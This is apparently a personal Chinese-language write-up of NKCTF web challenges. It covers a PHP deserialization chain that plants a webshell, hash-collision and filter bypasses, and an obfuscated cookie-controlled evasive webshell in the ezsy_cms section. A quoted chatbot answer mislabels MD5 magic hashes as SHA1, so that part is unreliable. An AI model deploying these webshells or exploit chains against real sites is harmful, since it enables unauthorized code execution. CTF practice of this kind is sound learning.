---
title: "NKctf"
date: "2023-01-02"
category: "CTF"
layout: prose
published: true
---

# babyser

```jsx
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'oww!man!!';
        public function __construct(){
            $this->name = 'ItS SO CREAZY';
        }
        public function __destruct(){
            if($this->name == 'welcome_to_NKCTF'){
                echo $this->arg;
            }
        }
    }

    function waf($string){
        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){
            die("you are bad");
        }
    }
    class Happy{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            waf($cmd);
            eval($shell($cmd));
        }
    }
    class Hell0{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['p'])){
        unserialize($_GET['p']);
    }else{
        highlight_file(__FILE__);
    }
    $a = new Happy();
    $b = new Hell0();
    $c = new Welcome();
    $c -> name = 'welcome_to_NKCTF';
    $a -> shell = 'system';
    $a ->cmd = 'echo \\'system($_POST[1]);\\' >> 1.php';//上传🐎
    $c->arg=$b;#toString
    $b->fuc=$a;#invoke
    echo urlencode(serialize($c));
?>

```
倒着看吧Happy 类里面有eval函数

触发invoke 需要触发hello里面的tostring

to string  需要welcome被当作字符串则需要触发destruct

之前b卡住了因为construct new对象的时候把name改了；无法destruct；

后面调用的时候改回来就好了

echo 'system($_POST[1]);' » 1.php

## baby_php

```jsx
<?php 
    highlight_file(__FILE__);
    error_reporting(0);
    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){
        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){
            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){
                if(isset($_GET['NS_CTF.go'])){
                    if(isset($_POST['cmd'])){
                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){
                            eval($_POST['cmd']);
                        }else{
                            die('error!!!!!!');
                        }
                    }else{
                        die('error!!!!!');
                    }
                }else{
                    die('error!!!!');
                }
            }else{
                die('error!!!');
            }
        }else{
            die('error!!');
        }
    }else{
        die('error!');
    }
?> error!!

```
第一个是数组绕过

第二个就有点意思了bing给我的是==号的绕过方法

```jsx
如果你只是想测试一下这个问题，你可以使用一些已知的 "魔术哈希"3，即一些特殊的字符串，它们的哈希值恰好符合这种模式。例如，你可以使用以下两个字符串：

c: QNKCDZO d: aaroZmOk

它们的 sha1 哈希值分别是：

c: 0e830400451993494058024219903391 d: 0e087386482136013740957780965295

你可以看到，它们都以 “0e” 开头，并且后面都是数字，所以它们会被 PHP 认为是相等的。但是它们本身是不同的字符串，所以它们会满足 if 语句的条件。

```
其实有印象是sha1的强碰撞

[https://blog.csdn.net/weixin_52118430/article/details/123855542?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167970001816800188539508%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167970001816800188539508&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123855542-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=sha1强碰撞](https://blog.csdn.net/weixin_52118430/article/details/123855542?ops_request_misc=%7B%22request%5Fid%22%3A%22167970001816800188539508%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167970001816800188539508&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123855542-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=sha1%E5%BC%BA%E7%A2%B0%E6%92%9E) 绕过&spm=1018.2226.3001.4187

string会把数组转换成null

```jsx
payload:array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```
intval绕过有很多

无字母最简单就是取反

## hardphp

```jsx
<?php
// not only ++
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['NKCTF'])) {
    $NK = $_POST['NKCTF'];
    if (is_string($NK)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\"|`~\\\\\\\\]/",$NK) && strlen($NK) < 105){
            eval($NK);
        }else{
            echo("hacker!!!");
        }
    }else{
        phpinfo();
    }
}
?>

```
我直接上网搜这个正则表达式，原题出来了

本置上是限制长度的自增

先通过fuzz看还剩下什么字符

```jsx
for ($i=32;$i<127;$i++){
    if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\"|`~\\\\\\\\]/",chr($i))){
        echo chr($i);
    }
}
//!$'()+,./;=[]_

```
听o2说要看php里面的disabledfunction

byd我就是乍system不行

shell_exec可以

# 禅道pms

[禅道系统权限绕过与命令执行漏洞](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247491671&idx=1&sn=850b394fac64fe3f4cdd8c767252e943)

发3个包

# ezsy_cms

byd做到时候环境开不起，纯白界面（ 最爱的隔空复现环节

admin admin 进后台

直接加的免杀shell

cookie传参对应webshell：

```jsx
<?php
$p=$_COOKIE;(count($p)==23&&in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&&($p[91]=$p[59]($p[91]))&&($p=$p[91]($p[90],$p[59]($p[31])))&&$p()):$p;
?>

```

# Social Engening

# bridge

NKCTF{海南省海口市龙华区绿地外滩公馆}

NKCTF{海南省海口市龙华区绿地世纪公园}
